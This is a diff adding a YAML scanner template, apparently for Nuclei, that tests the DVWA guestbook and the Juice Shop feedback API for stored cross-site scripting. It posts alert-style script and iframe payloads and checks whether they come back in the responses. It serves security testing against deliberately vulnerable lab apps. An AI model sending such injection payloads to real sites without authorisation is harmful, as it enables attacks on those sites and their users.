@@ -1,0 +1,59 @@
+id: hunt3r-xss-stored
+
+info:
+  name: XSS Stored Detection
+  author: hunt3r
+  severity: high
+  description: Detects stored XSS via comment/feedback forms in DVWA and Juice Shop.
+  tags: xss,stored-xss,hunt3r
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting/stored
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_s/"
+
+    body: "txtName=hunt3r&mtxMessage=<script>alert('hunt3r_stored_xss')</script>&btnSign=Sign+Guestbook"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "security=low"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert('hunt3r_stored_xss')</script>"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Feedbacks/"
+
+    body: '{"comment":"<iframe src=javascript:alert(`hunt3r_stored`)>","rating":1}'
+    headers:
+      Content-Type: "application/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [201, 200]
+
+      - type: word
+        part: body
+        words:
+          - "hunt3r_stored"
+          - "iframe"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/xss_s/"
+      - "{{BaseURL}}/#/contact"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert('hunt3r_stored_xss')</script>"
+          - "hunt3r_stored"
+        condition: or
